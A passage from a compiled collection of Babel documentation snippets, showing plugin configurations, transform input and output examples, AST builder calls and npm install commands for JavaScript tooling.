DESCRIPTION: Demonstrates usage of private static getters in a class to implement a singleton loader pattern. Shows how to define and use private static fields and accessors with the new class features.

LANGUAGE: JavaScript
CODE:
class Resource {
  static #loaderInstance = null;

  static get #loader() {
    if (!this.#loaderInstance) this.#loaderInstance = new Loader();
    return this.#loaderInstance;
  }

  status = null;

  constructor(url) {
    this.status = Resource.#loader.load(url);
  }
}

----------------------------------------

TITLE: Transforming Template Literals with Loose Option
DESCRIPTION: Shows the transformation of a template literal when the 'loose' option or mutableTemplateObject assumption is set to true, resulting in a simple string concatenation.

LANGUAGE: JavaScript
CODE:
`foo${bar}`;

LANGUAGE: JavaScript
CODE:
"foo" + bar;

----------------------------------------

TITLE: Using Nullish Coalescing Operator in JavaScript
DESCRIPTION: Demonstrates usage of the nullish coalescing operator (??) to provide a fallback value when an expression evaluates to null or undefined.

LANGUAGE: JavaScript
CODE:
const name = person.fullName ?? "Anonymous";
console.log(`Hello, ${name}!`);

----------------------------------------

TITLE: React JSX Development Transform Input Example
DESCRIPTION: Example of JSX code that will be transformed by the plugin, showing a simple profile component with an image and name display.

LANGUAGE: javascript
CODE:
const profile = (
  <div>
    <img src="avatar.png" className="profile" />
    <h3>{[user.firstName, user.lastName].join(" ")}</h3>
  </div>
);

----------------------------------------

TITLE: Configuring Decorators in Babel
DESCRIPTION: Configuration for enabling the 2023-11 version of the decorators proposal in Babel. This version matches the latest specification and TypeScript implementation.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-decorators", {
      "version": "2023-11"
    }]
  ]
}

----------------------------------------

TITLE: Using Decorators in Babel 7.1.0
DESCRIPTION: Support for the decorators proposal, as specified in September 2018.

LANGUAGE: JavaScript
CODE:
class Person {
  @autoIncrement age;
}

----------------------------------------

TITLE: Demonstrating allowDeclareFields option in JavaScript
DESCRIPTION: Shows the effect of the allowDeclareFields option on class field declarations with Flow types.

LANGUAGE: JavaScript
CODE:
class A {
  declare foo: string; // Removed
  bar: string; // Initialized to undefined
}

----------------------------------------

TITLE: Class Transformation Example Input/Output
DESCRIPTION: Shows how a basic ES6 class is transformed into ES5 compatible code by the plugin.

LANGUAGE: javascript
CODE:
class Test {
  constructor(name) {
    this.name = name;
  }

  logger() {
    console.log("Hello", this.name);
  }
}

LANGUAGE: javascript
CODE:
function _classCallCheck(instance, Constructor) {
  if (!(instance instanceof Constructor)) {
    throw new TypeError("Cannot call a class as a function");
  }
}

var Test = (function() {
  function Test(name) {
    _classCallCheck(this, Test);

    this.name = name;
  }

  Test.prototype.logger = function logger() {
    console.log("Hello", this.name);
  };

  return Test;
})();

----------------------------------------

TITLE: Integrating Babel Standalone in HTML for In-Browser Transpilation
DESCRIPTION: This snippet demonstrates how to include @babel/standalone in an HTML file and use it to transpile and execute ES6+ JavaScript code directly in the browser. It loads the Babel standalone script, defines a simple ES6 arrow function, and updates the DOM with the result.

LANGUAGE: html
CODE:
<div id="output"></div>
<!-- Load Babel -->
<!-- v6 <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script> -->
<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
<!-- Your custom script here -->
<script type="text/babel">
const getMessage = () => "Hello World";
document.getElementById('output').innerHTML = getMessage();
</script>

----------------------------------------

TITLE: Updating ESLint Configuration
DESCRIPTION: Changes required in the .eslintrc.js configuration file to use the new @babel/eslint-parser and its plugin.

LANGUAGE: javascript
CODE:
module.exports = {
  parser: "@babel/eslint-parser",
  plugins: [
    "@babel"
  ]
};

----------------------------------------

TITLE: Demonstrating Decorator Metadata in JavaScript
DESCRIPTION: This snippet showcases the usage of the new Decorator Metadata proposal, allowing decorators to communicate by sharing metadata.

LANGUAGE: javascript
CODE:
function write(_, context) {
  context.metadata.message = "Hello from writer!";
}
function read(_, context) {
  console.log(context.metadata.message);
}

@read // Logs "Hello from writer!"
class A {
  @write x;
}

----------------------------------------

TITLE: Transforming Using Declarations with Babel
DESCRIPTION: Example showing how the plugin transforms 'using' declarations into try-catch-finally blocks with proper resource disposal.

LANGUAGE: javascript
CODE:
using handlerSync = openSync();
await using handlerAsync = await openAsync();

LANGUAGE: javascript
CODE:
try {
  var _stack = [];
  var handlerSync = babelHelpers.using(_stack, openSync());
  var handlerAsync = babelHelpers.using(_stack, await openAsync(), true);
} catch (_) {
  var _error = _;
  var _hasError = true;
} finally {
  await babelHelpers.dispose(_stack, _error, _hasError);
}

----------------------------------------

TITLE: Using Babel Plugin via Node API - JavaScript
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-exponentiation-operator"],
});

----------------------------------------

TITLE: Demonstrating RegExp Set Notation and Properties of Strings
DESCRIPTION: These JavaScript examples show the new RegExp features introduced with the 'v' flag, including extended set notation, properties of strings, and multi-codepoint strings in sets.

LANGUAGE: JavaScript
CODE:
/[\p{Decimal_Number}--[0-9]]/v; // Non-ASCII decimal digits
/[\p{ASCII}&&\p{Letter}]/v; // ASCII letters
/[[\p{ASCII}&&\p{Letter}]\p{Number}]/v; // ASCII letters, or any digit

"Did you see the 👩🏿‍❤️‍💋‍👩🏾 emoji?".match(/\p{RGI_Emoji}/v). // ["👩🏿‍❤️‍💋‍👩🏾"]

/[\r\n\q{\r\n|NEWLINE}]/v; // Matches \r, \n, \r\n or NEWLINE

----------------------------------------

TITLE: Using Split Export Declaration in Babel Traverse in JavaScript
DESCRIPTION: This example demonstrates how to use the splitExportDeclaration helper within a Babel traverse. It splits export declarations for default class exports, allowing for separate processing of the class and its export.

LANGUAGE: JavaScript
CODE:
import traverse from "@babel/traverse";
import splitExportDeclaration from "@babel/helper-split-export-declaration";

// ...

traverse(file, {
  ExportDefaultDeclaration(path) {
    if (!path.get("declaration").isClassDeclaration()) return;
    splitExportDeclaration(path);
  },
});

----------------------------------------

TITLE: Configuring Object Rest/Spread Plugin with useBuiltIns Option
DESCRIPTION: This JSON configuration enables the useBuiltIns option for the object rest/spread transform plugin, causing it to use Object.assign directly.

LANGUAGE: JSON
CODE:
{
  "assumptions": {
    "setSpreadProperties": true
  },
  "plugins": [
    ["@babel/plugin-transform-object-rest-spread", { "useBuiltIns": true }]
  ]
}

----------------------------------------

TITLE: Comparing Nullish Coalescing vs Logical OR in JavaScript
DESCRIPTION: Shows the difference between using nullish coalescing (??) and logical OR (||) operators for providing default values.

LANGUAGE: JavaScript
CODE:
const element = { index: 0, value: "foo" };

const index = element.index ?? -1; //  0 :D
const index = element.index || -1; // -1 :(

----------------------------------------

TITLE: Using @babel/plugin-transform-parameters via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-parameters plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-parameters script.js

----------------------------------------

TITLE: Transforming React Component Display Names in JavaScript
DESCRIPTION: This snippet demonstrates how the plugin transforms React component creation calls to include a displayName property. It shows examples for both React.createClass (React <= 15) and createReactClass (React 16+).

LANGUAGE: JavaScript
CODE:
var foo = React.createClass({}); // React <= 15
var bar = createReactClass({}); // React 16+

LANGUAGE: JavaScript
CODE:
var foo = React.createClass({
  displayName: "foo",
}); // React <= 15
var bar = createReactClass({
  displayName: "bar",
}); // React 16+

----------------------------------------

TITLE: Using Duplicated Named Capturing Groups in RegExp - JavaScript
DESCRIPTION: Demonstrates the usage of duplicated named capturing groups in regular expressions to match dates in different formats. This feature is now supported by default in @babel/preset-env.

LANGUAGE: javascript
CODE:
let re = /(?<day>\d\d)\/(?<month>\d\d)\/(?<year>\d\d\d\d)|(?<year>\d\d\d\d)-(?<month>\d\d)-(?<day>\d\d)/;

"21/12/2023".match(re).groups.day; // 21
"2023-12-21".match(re).groups.day; // 21

----------------------------------------

TITLE: Multi-Pass AST Transformation
DESCRIPTION: Example demonstrating how to perform multiple transformation passes on an AST by first compiling without code generation and then minifying in a second pass.

LANGUAGE: JavaScript
CODE:
const filename = "example.js";
const source = fs.readFileSync(filename, "utf8");

// Load and compile file normally, but skip code generation.
const { ast } = babel.transformSync(source, {
  filename,
  ast: true,
  code: false,
});

// Minify the file in a second pass and generate the output code here.
const { code, map } = babel.transformFromAstSync(ast, source, {
  filename,
  presets: ["minify"],
  babelrc: false,
  configFile: false,
});

----------------------------------------

TITLE: Using React Classic Runtime
DESCRIPTION: This example demonstrates the transformation of JSX using the React Classic Runtime. It shows how JSX is converted to React.createElement calls without automatic imports.

LANGUAGE: JavaScript
CODE:
const profile = (
  <div>
    <img src="avatar.png" className="profile" />
    <h3>{[user.firstName, user.lastName].join(" ")}</h3>
  </div>
);

LANGUAGE: JavaScript
CODE:
const profile = React.createElement(
  "div",
  null,
  React.createElement("img", { src: "avatar.png", className: "profile" }),
  React.createElement("h3", null, [user.firstName, user.lastName].join(" "))
);

----------------------------------------

TITLE: Demonstrating Object Spread Transformation with useBuiltIns
DESCRIPTION: This JavaScript code shows how object spread syntax is transformed when the useBuiltIns option is enabled in the plugin configuration.

LANGUAGE: JavaScript
CODE:
z = { x, ...y };

LANGUAGE: JavaScript
CODE:
z = Object.assign({ x }, y);

----------------------------------------

TITLE: Configuring Babel to Use SystemJS Transform Plugin in JSON
DESCRIPTION: These JSON snippets show how to configure Babel to use the @babel/plugin-transform-modules-systemjs plugin, both with and without options. The 'systemGlobal' option allows specifying a custom global name for SystemJS.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-modules-systemjs"]
}

LANGUAGE: JSON
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-modules-systemjs",
      {
        "systemGlobal": "SystemJS"
      }
    ]
  ]
}

----------------------------------------

TITLE: Creating an AwaitExpression Node
DESCRIPTION: Example of creating an AwaitExpression node using the t.awaitExpression(argument) builder function.

LANGUAGE: JavaScript
CODE:
t.awaitExpression(argument);

----------------------------------------

TITLE: Configuring Hermes Flow Parser
DESCRIPTION: Configuration for enabling the experimental Hermes-based Flow parser in Babel's Flow preset.

LANGUAGE: json
CODE:
{
  "presets": [
    ["@babel/preset-flow", {
      "experimental_useHermesParser": true
    }]
  ]
}

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration for enabling the TypeScript transform plugin

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-typescript"]
}

----------------------------------------

TITLE: Transforming Template Literals with Babel Plugin
DESCRIPTION: Demonstrates the transformation of a template literal using the @babel/plugin-transform-template-literals plugin. The input template literal is converted to a string concatenation operation.

LANGUAGE: JavaScript
CODE:
`foo${bar}`;

LANGUAGE: JavaScript
CODE:
"foo".concat(bar);

----------------------------------------

TITLE: Configuring Babel for Deferred Import Evaluation
DESCRIPTION: This JSON configuration snippet shows how to set up Babel to use the Deferred Import Evaluation plugin with CommonJS module transformation.

LANGUAGE: json
CODE:
{
  "plugins": [
    "@babel/plugin-transform-modules-commonjs",
    "@babel/plugin-proposal-import-defer"
  ]
}

----------------------------------------

TITLE: Dead Code Elimination Example
DESCRIPTION: Demonstrates how the plugin removes unused variables, functions, and simplifies code while preserving functionality

LANGUAGE: javascript
CODE:
function foo() {var x = 1;}
function bar() { var x = f(); }
function baz() {
  var x = 1;
  console.log(x);
  function unused() {
    return 5;
  }
}

LANGUAGE: javascript
CODE:
function foo() {}
function bar() { f(); }
function baz() {
  console.log(1);
}

----------------------------------------

TITLE: Parsing Smart Pipeline Operator in JavaScript with Babel Parser
DESCRIPTION: Shows examples of using the Smart Pipeline Operator syntax, which can now be parsed by @babel/parser. The example compares the 'Smart' and 'Simple' pipeline syntaxes.

LANGUAGE: JavaScript
CODE:
// "Smart"
const result = 2 |> double |> 3 + # |> toStringBase(2, #); // "111"

// "Simple"
const result = 2 |> double |> (x => 3 + x) |> (x => toStringBase(2, x));

----------------------------------------

TITLE: Configuring Babel Plugin without Options
DESCRIPTION: Demonstrates how to configure the @babel/plugin-transform-template-literals plugin in a Babel configuration file without any options.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-template-literals"]
}

----------------------------------------

TITLE: CommonJS Module Export Example
DESCRIPTION: Shows how a default export gets transformed to CommonJS format.

LANGUAGE: javascript
CODE:
"use strict";

Object.defineProperty(exports, "__esModule", { value: true });
exports.default = two;

function two() {
  return 2;
}

----------------------------------------

TITLE: Transforming JavaScript to Strict Mode with Babel
DESCRIPTION: This snippet demonstrates how the @babel/plugin-transform-strict-mode plugin adds 'use strict' to the beginning of JavaScript code. It shows the input code and the resulting output after transformation.

LANGUAGE: JavaScript
CODE:
foo();

LANGUAGE: JavaScript
CODE:
"use strict";

foo();

----------------------------------------

TITLE: Complex Conditional Logic with Do Expressions
DESCRIPTION: Shows how do expressions can handle more complex nested conditional logic with multiple if-else statements.

LANGUAGE: javascript
CODE:
let x = 100;
let y = 20;

let a = do {
  if (x > 10) {
    if (y > 20) {
      ("big x, big y");
    } else {
      ("big x, small y");
    }
  } else {
    if (y > 10) {
      ("small x, big y");
    } else {
      ("small x, small y");
    }
  }
};

----------------------------------------

TITLE: Using Import Attributes in JavaScript
DESCRIPTION: Demonstrates the new syntax for Import Attributes, which replaces Import Assertions.

LANGUAGE: JavaScript
CODE:
import json from "./foo.json" with { type: "json" };

import("./foo.json", { with: { type: "json" } });

----------------------------------------

TITLE: Multi-Source AST Generation
DESCRIPTION: Advanced example showing how to generate code from an AST constructed from multiple source files while maintaining correct source mappings.

LANGUAGE: javascript
CODE:
import { parse } from "@babel/parser";
import generate from "@babel/generator";

const a = "var a = 1;";
const b = "var b = 2;";
const astA = parse(a, { sourceFilename: "a.js" });
const astB = parse(b, { sourceFilename: "b.js" });
const ast = {
  type: "Program",
  body: [].concat(astA.program.body, astB.program.body),
};

const { code, map } = generate(
  ast,
  { sourceMaps: true },
  {
    "a.js": a,
    "b.js": b,
  }
);

----------------------------------------

TITLE: Using babel-minify Node API
DESCRIPTION: Example of using babel-minify's Node.js API to minify JavaScript code with custom options for keeping class names.

LANGUAGE: javascript
CODE:
const minify = require("babel-minify");

const { code, map } = minify("input code", {
  mangle: {
    keepClassName: true,
  },
});

----------------------------------------

TITLE: Transforming ES Module Export to AMD in JavaScript
DESCRIPTION: This snippet demonstrates how the plugin transforms a default export in ES module syntax to AMD format. It shows the input code and the resulting output after transformation.

LANGUAGE: JavaScript
CODE:
export default 42;

LANGUAGE: JavaScript
CODE:
define(["exports"], function(exports) {
  "use strict";

  Object.defineProperty(exports, "__esModule", {
    value: true,
  });

  exports.default = 42;
});

----------------------------------------

TITLE: Transforming Spread Syntax with Babel
DESCRIPTION: Example showing how spread syntax is transformed from ES6 to ES5 compatible code. The transformation converts array spread to concat() and function spread to apply().

LANGUAGE: javascript
CODE:
var a = ["a", "b", "c"];

var b = [...a, "foo"];

var c = foo(...a);

LANGUAGE: javascript
CODE:
var a = ["a", "b", "c"];

var b = a.concat(["foo"]);

var c = foo.apply(void 0, a);

----------------------------------------

TITLE: Configuring Babel for Import Attributes
DESCRIPTION: Shows how to update Babel configuration to use the new Import Attributes syntax plugin.

LANGUAGE: JSON
CODE:
{
  "plugins": [
    "@babel/syntax-import-attributes"
  ]
}

----------------------------------------

TITLE: Example Export Default From Syntax
DESCRIPTION: Demonstrates the simplified export default from syntax enabled by this Babel plugin.

LANGUAGE: javascript
CODE:
export v from "mod";

----------------------------------------

TITLE: Transforming Regex with /s and /u Flags in JavaScript
DESCRIPTION: This snippet shows the transformation of a regular expression with both /s and /u flags. It converts /./su to /[\0-\u{10FFFF}]/u.

LANGUAGE: JavaScript
CODE:
/./su;

LANGUAGE: JavaScript
CODE:
/[\0-\u{10FFFF}]/u;

----------------------------------------

TITLE: Configuring @babel/plugin-transform-parameters in babel.config.json
DESCRIPTION: This JSON snippet shows how to include the @babel/plugin-transform-parameters plugin in the Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-parameters"]
}

----------------------------------------

TITLE: Simplifying Conditional Statements in JavaScript with babel-plugin-minify-simplify
DESCRIPTION: Demonstrates how the plugin reduces if statements into expressions, improving code compressibility. It shows the transformation of simple if statements into logical AND (&&) operations and ternary operators.

LANGUAGE: JavaScript
CODE:
function foo() {
  if (x) a();
}
function foo2() {
  if (x) a();
  else b();
}

LANGUAGE: JavaScript
CODE:
function foo() {
  x && a();
}
function foo2() {
  x ? a() : b();
}

----------------------------------------

TITLE: Converting Complex Variable Updates in JavaScript
DESCRIPTION: Examples of complex variable update patterns that the helper aims to simplify into standard assignments. Shows increment and decrement operations that need to be converted.

LANGUAGE: javascript
CODE:
i += 1
--i;

----------------------------------------

TITLE: Transforming JSX with React Self Attribute
DESCRIPTION: Demonstrates how the plugin transforms JSX by adding the __self attribute. It shows the input JSX and the resulting output after transformation.

LANGUAGE: jsx
CODE:
<sometag />

LANGUAGE: jsx
CODE:
<sometag __self={this} />

----------------------------------------

TITLE: Transforming React JSX to React.DOM Calls in JavaScript
DESCRIPTION: This snippet demonstrates how the plugin transforms JSX syntax into equivalent React.DOM method calls. It converts a JSX-based profile component into plain JavaScript using React.DOM methods.

LANGUAGE: JavaScript
CODE:
var profile = (
  <div>
    <img src="avatar.png" class="profile" />
    <h3>{[user.firstName, user.lastName].join(" ")}</h3>
  </div>
);

LANGUAGE: JavaScript
CODE:
var profile = React.DOM.div(
  null,
  React.DOM.img({ src: "avatar.png", class: "profile" }),
  React.DOM.h3(null, [user.firstName, user.lastName].join(" "))
);

----------------------------------------

TITLE: Using Named Capturing Groups in Regular Expressions
DESCRIPTION: Demonstrates the usage of named capturing groups in regular expressions, a feature from ECMAScript 2018.

LANGUAGE: javascript
CODE:
let stringRe = /(?<quote>"|')(?<contents>.*?)\k<quote>/;

let { contents } = `"foo bar"`.match(stringRe);

----------------------------------------

TITLE: Demonstrating Smart Pipeline Proposal in JavaScript
DESCRIPTION: This snippet shows the Smart Pipeline proposal in JavaScript. It demonstrates the use of the placeholder (#) for partial application and arbitrary expressions, including async/await operations, in a complex chain of operations.

LANGUAGE: javascript
CODE:
promise
  |> await #
  |> doubleSay(#, ', ')
  |> # || throw new TypeError()
  |> capitalize
  |> # + '!'
  |> new User.Message(#)
  |> await stream.write(#)
  |> console.log;

----------------------------------------

TITLE: Transforming a JavaScript class without @babel/runtime
DESCRIPTION: Example of how Babel transforms a simple class declaration without using @babel/runtime, resulting in repeated helper functions.

LANGUAGE: javascript
CODE:
class Circle {}

LANGUAGE: javascript
CODE:
function _classCallCheck(instance, Constructor) {
  //...
}

var Circle = function Circle() {
  _classCallCheck(this, Circle);
};

----------------------------------------

TITLE: Babel Configuration with TypeScript Preset
DESCRIPTION: JSON configuration for enabling TypeScript preset in Babel

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-typescript"]
}

----------------------------------------

TITLE: Using Object Rest/Spread Transform Plugin via Node API
DESCRIPTION: This JavaScript code shows how to use the object rest/spread transform plugin programmatically with Babel's Node.js API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-object-rest-spread"],
});

----------------------------------------

TITLE: Using Babel CLI for Nullish Coalescing Operator Transform
DESCRIPTION: Shows how to use the Babel CLI to transform a script using the nullish coalescing operator plugin.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-nullish-coalescing-operator script.js

----------------------------------------

TITLE: Advanced Babel Minify Configuration
DESCRIPTION: Configuration with custom options for mangle, unsafe operations, and function name preservation

LANGUAGE: json
CODE:
{
  "presets": [["minify", {
    "mangle": {
      "exclude": ["MyCustomError"]
    },
    "unsafe": {
      "typeConstructors": false
    },
    "keepFnName": true
  }]]
}

----------------------------------------

TITLE: TypeScript 4.0 Labeled Tuple Elements
DESCRIPTION: Example of labeled tuple elements, a new feature in TypeScript 4.0 allowing names for tuple elements.

LANGUAGE: TypeScript
CODE:
type Log = [failed: boolean, reason?: Error, ...stacks?: string[]]
// same as
type Log = [boolean, Error?, string[]?];

----------------------------------------

TITLE: Configuring babel-loader in Webpack
DESCRIPTION: This JavaScript snippet shows how to configure babel-loader in Webpack 5+. It demonstrates the use of the 'options' object to specify Babel presets, replacing the deprecated query parameter method.

LANGUAGE: javascript
CODE:
{
    loader: "babel-loader",
    options: {
        presets: ["@babel/preset-env"]
    }
}

----------------------------------------

TITLE: Transforming ES2015 Module Export to UMD in JavaScript
DESCRIPTION: This example demonstrates how the plugin transforms a simple ES2015 module export into a UMD-compatible format. It shows the input code and the resulting output after transformation.

LANGUAGE: JavaScript
CODE:
export default 42;

LANGUAGE: JavaScript
CODE:
(function(global, factory) {
  if (typeof define === "function" && define.amd) {
    define(["exports"], factory);
  } else if (typeof exports !== "undefined") {
    factory(exports);
  } else {
    var mod = {
      exports: {},
    };
    factory(mod.exports);
    global.actual = mod.exports;
  }
})(this, function(exports) {
  "use strict";

  Object.defineProperty(exports, "__esModule", {
    value: true,
  });

  exports.default = 42;
});

----------------------------------------

TITLE: Using codeFrameColumns Basic Example
DESCRIPTION: Demonstrates basic usage of codeFrameColumns function to highlight specific code location with line numbers and markers.

LANGUAGE: javascript
CODE:
import { codeFrameColumns } from "@babel/code-frame";

const rawLines = `class Foo {
  constructor()
}`;
const location = { start: { line: 2, column: 16 } };

const result = codeFrameColumns(rawLines, location, {
  /* options */
});

console.log(result);

----------------------------------------

TITLE: Transforming Undefined Values in JavaScript with Babel
DESCRIPTION: This code snippet demonstrates the transformation of undefined values using the babel-plugin-transform-remove-undefined plugin. It shows the input code with void 0 and undefined assignments, and the resulting output after transformation.

LANGUAGE: JavaScript
CODE:
let a = void 0;
function foo() {
  var b = undefined;
  return undefined;
}

LANGUAGE: JavaScript
CODE:
let a;
function foo() {
  var b;
  return;
}

----------------------------------------

TITLE: Configuring @babel/plugin-transform-unicode-property-regex in babel.config.json
DESCRIPTION: JSON configuration to add the Unicode property regex transform plugin to Babel.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-unicode-property-regex"]
}

----------------------------------------

TITLE: Complete Named Import Example
DESCRIPTION: A full example showing how to use addNamed in a Babel plugin visitor to add a named import for 'coroutine' from 'bluebird'.

LANGUAGE: javascript
CODE:
import { addNamed } from "@babel/helper-module-imports";

export default function({ types: t }) {
  return {
    visitor: {
      ReferencedIdentifier(path) {
        let importName = this.importName;
        if (importName) {
          importName = t.cloneDeep(importName);
        } else {
          // require('bluebird').coroutine
          importName = this.importName = addNamed(path, 'coroutine', 'bluebird');
        }

        path.replaceWith(importName);
      }
    },
  };
}

----------------------------------------

TITLE: Configuring Babel Plugin in JavaScript
DESCRIPTION: Demonstrates how to configure the plugin in a Babel configuration file, both without and with options.

LANGUAGE: JavaScript
CODE:
{
  "plugins": ["@babel/plugin-transform-for-of"]
}

LANGUAGE: JavaScript
CODE:
{
  "plugins": [
    ["@babel/plugin-transform-for-of", {
      "loose": true, // defaults to false
      "assumeArray": true // defaults to false
    }]
  ]
}

----------------------------------------

TITLE: Transforming Environment Variables in JavaScript with Babel
DESCRIPTION: Demonstrates how the plugin transforms environment variable access into inline string values. In this example, process.env.NODE_ENV is replaced with its actual value "development".

LANGUAGE: JavaScript
CODE:
// assuming process.env.NODE_ENV is actually "development"
process.env.NODE_ENV;

LANGUAGE: JavaScript
CODE:
"development";

----------------------------------------

TITLE: Private Fields with Optional Chaining in JavaScript
DESCRIPTION: Demonstrates the new support for mixing optional chaining with private fields in class definitions.

LANGUAGE: JavaScript
CODE:
obj?.property.#priv;
obj?.#priv;

----------------------------------------

TITLE: Demonstrating Minification of Variable Names in JavaScript
DESCRIPTION: This example shows how the plugin transforms code by shortening local variable names while preserving global variable names.

LANGUAGE: JavaScript
CODE:
var globalVariableName = 42;
function foo() {
  var longLocalVariableName = 1;
  if (longLocalVariableName) {
    console.log(longLocalVariableName);
  }
}

LANGUAGE: JavaScript
CODE:
var globalVariableName = 42;
function foo() {
  var a = 1;
  if (a) {
    console.log(a);
  }
}

----------------------------------------

TITLE: Implementing Throw Expressions in JavaScript
DESCRIPTION: Example showing how throw expressions can be used in parameter defaults and logical expressions.

LANGUAGE: javascript
CODE:
function test(param = throw new Error("required!")) {
  const test = param === true || throw new Error("Falsy!");
}

----------------------------------------

TITLE: Optimizing Expressions for Compressibility in JavaScript with babel-plugin-minify-simplify
DESCRIPTION: Shows how the plugin transforms expressions to make them more uniform and compressible. It demonstrates conversions such as using 'void 0' for undefined, dot notation for object properties, and the unary plus operator for number conversion.

LANGUAGE: JavaScript
CODE:
undefined
foo['bar']
Number(foo)

LANGUAGE: JavaScript
CODE:
void 0
foo.bar
+foo

----------------------------------------

TITLE: Creating an ArrayTypeAnnotation Node
DESCRIPTION: Example of creating an ArrayTypeAnnotation node using the t.arrayTypeAnnotation(elementType) builder function.

LANGUAGE: JavaScript
CODE:
t.arrayTypeAnnotation(elementType);

----------------------------------------

TITLE: Optimizing for-of Loop for Arrays in JavaScript
DESCRIPTION: Shows how the plugin optimizes a for-of loop over an array into a standard for loop when possible.

LANGUAGE: JavaScript
CODE:
for (let a of [1, 2, 3]) {
}

LANGUAGE: JavaScript
CODE:
var _arr = [1, 2, 3];
for (var _i = 0; _i < _arr.length; _i++) {
  var a = _arr[_i];
}

----------------------------------------

TITLE: Installing @babel/cli Package
DESCRIPTION: Command to install the Babel CLI package as a development dependency. The command uses npm package manager and saves the dependency in package.json under devDependencies.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/cli

----------------------------------------

TITLE: Calling Nested Functions with Optional Chaining in JavaScript
DESCRIPTION: Shows how to safely call functions that may be nested within objects using optional chaining. Includes examples of handling undefined functions and direct function calls.

LANGUAGE: javascript
CODE:
const obj = {
  foo: {
    bar: {
      baz() {
        return 42;
      },
    },
  },
};

const baz = obj?.foo?.bar?.baz(); // 42

const safe = obj?.qux?.baz(); // undefined
const safe2 = obj?.foo.bar.qux?.(); // undefined

const willThrow = obj?.foo.bar.qux(); // Error: not a function

function test() {
  return 42;
}
test?.(); // 42

exists?.(); // undefined

----------------------------------------

TITLE: Creating an AssignmentExpression Node
DESCRIPTION: Example of creating an AssignmentExpression node using the t.assignmentExpression(operator, left, right) builder function.

LANGUAGE: JavaScript
CODE:
t.assignmentExpression(operator, left, right);

----------------------------------------

TITLE: Basic Import Attributes Usage in JavaScript
DESCRIPTION: Demonstrates the usage of import attributes syntax with the 'with' keyword to specify JSON import type.

LANGUAGE: javascript
CODE:
import foo from "./foo.json" with { type: "json" };

----------------------------------------

TITLE: Configuring Babel to Use the Plugin in JSON
DESCRIPTION: This JSON configuration snippet shows how to include the @babel/plugin-transform-unicode-sets-regex plugin in a Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-unicode-sets-regex"]
}

----------------------------------------

TITLE: Nullish Coalescing Operator Precedence Examples
DESCRIPTION: Demonstrates correct usage of the nullish coalescing operator (??) with other logical operators, showing required parentheses for proper precedence handling.

LANGUAGE: JavaScript
CODE:
(a ?? b) || c; /* or */ a ?? (b || c);
(a && b) ?? c; /* or */ a && (b ?? c);

----------------------------------------

TITLE: Example Transformation in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms undefined comparison to void 0

LANGUAGE: javascript
CODE:
foo === undefined;

LANGUAGE: javascript
CODE:
foo === void 0;

----------------------------------------

TITLE: Demonstrating Spread Properties in JavaScript
DESCRIPTION: This snippet demonstrates how to use spread properties to combine multiple objects into a new object.

LANGUAGE: JavaScript
CODE:
let n = { x, y, ...z };
console.log(n); // { x: 1, y: 2, a: 3, b: 4 }

----------------------------------------

TITLE: Installing babel-preset-env using npm
DESCRIPTION: Command to install babel-preset-env as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install babel-preset-env --save-dev

----------------------------------------

TITLE: Transforming ES Module Export to SystemJS in JavaScript
DESCRIPTION: This snippet demonstrates how the plugin transforms a default export statement from ES module syntax to SystemJS format. It shows the input code and the resulting output after transformation.

LANGUAGE: JavaScript
CODE:
export default 42;

LANGUAGE: JavaScript
CODE:
System.register([], function(_export, _context) {
  return {
    setters: [],
    execute: function() {
      _export("default", 42);
    },
  };
});

----------------------------------------

TITLE: JSX Fragment Support
DESCRIPTION: Example showing the new JSX Fragment syntax support and its compiled output.

LANGUAGE: JSX
CODE:
render() {
  return (
    <>
      <ChildA />
      <ChildB />
    </>
  );
}

----------------------------------------

TITLE: Configuring Babel to use Record and Tuple plugin
DESCRIPTION: JSON configuration for enabling the Record and Tuple plugin in Babel.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-proposal-record-and-tuple"]
}

----------------------------------------

TITLE: Installing @babel/plugin-proposal-decorators via npm
DESCRIPTION: Command to install the @babel/plugin-proposal-decorators Babel plugin using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-proposal-decorators

----------------------------------------

TITLE: Transforming Optional Chaining Assignment in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms optional chaining on the left-hand side of assignment expressions. It shows the input code and the resulting output after transformation.

LANGUAGE: javascript
CODE:
function doSomething(maybeOptions) {
  maybeOptions?.retries = 5;
}

LANGUAGE: javascript
CODE:
function doSomething(maybeOptions) {
  maybeOptions !== null && maybeOptions !== void 0 && maybeOptions.retries = 5;
}

----------------------------------------

TITLE: Demonstrating Throw Expression Syntax in JavaScript
DESCRIPTION: Example showing how throw expressions can be used in parameter defaults and conditional expressions.

LANGUAGE: javascript
CODE:
function test(param = throw new Error('required!')) {
  const test = param === true || throw new Error('Falsy!');
}

----------------------------------------

TITLE: Babel Configuration with Options
DESCRIPTION: Configuration showing how to enable the plugin with the loose option set to true.

LANGUAGE: json
CODE:
{
  "plugins": [["@babel/plugin-transform-class-properties", { "loose": true }]]
}

----------------------------------------

TITLE: Basic Plugin Configuration
DESCRIPTION: Standard configuration for using the class static block transform plugin.

